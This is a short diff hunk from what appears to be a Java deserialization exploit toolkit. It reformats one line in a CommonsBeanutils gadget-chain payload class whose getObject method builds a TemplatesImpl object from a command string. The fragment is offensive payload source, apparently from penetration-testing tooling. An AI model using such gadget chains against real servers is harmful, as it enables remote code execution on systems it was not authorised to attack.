@@ -19,7 +19,7 @@ public class CommonsBeanutilsAttrCompare192 implements ObjectPayload<Object> {
     public Object getObject(String command) throws Exception {
         final Object template;
         template = Gadgets.createTemplatesImpl(command);
-        AttrNSImpl       attrNS1      = new AttrNSImpl();
+        AttrNSImpl attrNS1 = new AttrNSImpl();
         CoreDocumentImpl coreDocument = new CoreDocumentImpl();
         attrNS1.setValues(coreDocument, "1", "1", "1");
 
